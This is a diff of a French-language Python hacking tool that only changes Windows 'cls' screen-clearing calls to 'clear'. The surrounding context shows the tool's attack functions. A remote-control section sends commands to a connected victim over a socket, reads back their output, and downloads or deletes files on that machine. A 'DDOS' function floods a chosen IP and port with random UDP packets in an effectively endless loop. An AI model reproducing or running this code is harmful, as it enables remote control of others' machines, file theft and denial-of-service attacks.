@@ -64,7 +64,7 @@ while True:
 
     #Exit
     def exitos():
-        os.system('cls')
+        os.system('clear')
         print(Colorate.Horizontal(Colors.blue_to_cyan, """
                          ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                          ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -141,7 +141,7 @@ while True:
                 print("                         Command output : ", files)
                 print("\n")
                 time.sleep(7)
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -160,7 +160,7 @@ while True:
                 print("")
                 user_input = input(str("                              Repertoir a personnalisé : "))
                 conn.send(user_input.encode())
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -177,7 +177,7 @@ while True:
                 print("")
                 files = conn.recv(5000)
                 files = files.decode()
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -192,7 +192,7 @@ while True:
                         """, 1))
                 print("                               Custom Resultat : ", files)
                 time.sleep(7)
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -212,7 +212,7 @@ while True:
                 filepath = input(str("                                Entrez le nom du fichier : "))
                 conn.send(filepath.encode())
                 file = conn.recv(100000)
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -229,7 +229,7 @@ while True:
                 new_file = open(filename, "wb")
                 new_file.write(file)
                 new_file.close()
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -245,7 +245,7 @@ while True:
                 print( "                            Le telechargemenet a bien été fait ")
                 print("")
                 time.sleep(7)
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -264,7 +264,7 @@ while True:
                 print("")
                 fileanddir = input(str("                                   Nom de fichier : "))
                 conn.send(fileanddir.encode())
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -279,7 +279,7 @@ while True:
                         """, 1))
                 print("                                Fichier supprimé ! ")
                 time.sleep(7)
-                os.system('cls')
+                os.system('clear')
                 print(Colorate.Horizontal(Colors.blue_to_cyan, """
                                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                                  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -314,7 +314,7 @@ while True:
 
     #SCAN PORT
     def scanport():
-        os.system('cls')
+        os.system('clear')
         print(Colorate.Horizontal(Colors.blue_to_cyan, """
                          ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                          ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -334,7 +334,7 @@ while True:
     #DDOS
     def ddos():
         os.system('title IP-DDOS')
-        os.system('cls')
+        os.system('clear')
         os.system('color c')
 
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -353,7 +353,7 @@ while True:
                 """, 1))
         ip = str(input('                                   > IP: '))
 
-        os.system('cls')
+        os.system('clear')
         print(Colorate.Horizontal(Colors.blue_to_cyan, """
                          ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                          ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -368,7 +368,7 @@ while True:
                 """, 1))
         port = int(input('                                  > Port: '))
 
-        os.system('cls')
+        os.system('clear')
         print(Colorate.Horizontal(Colors.blue_to_cyan, """
                          ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                          ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -387,7 +387,7 @@ while True:
 
         for i in range(1, 10**1000):
             s.send(random._urandom(10)*1000)
-            os.system('cls')
+            os.system('clear')
             print(Colorate.Horizontal(Colors.blue_to_cyan, """
                              ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
                              ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -407,7 +407,7 @@ while True:
 
     #SCAN
     def scan():
-        os.system('cls')
+        os.system('clear')
         #os.system('color c')
         print(Colorate.Horizontal(Colors.blue_to_cyan, """
                          ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
@@ -428,7 +428,7 @@ while True:
 
     #Interface Principal
     if (accounts.get(username) == password):
-        os.system('cls')
+        os.system('clear')
         #os.system('color c')
         print(Colorate.Horizontal(Colors.blue_to_cyan,"""
                  ██▀███  ▓█████ ▓█████▄  ▒█████    ██████ 
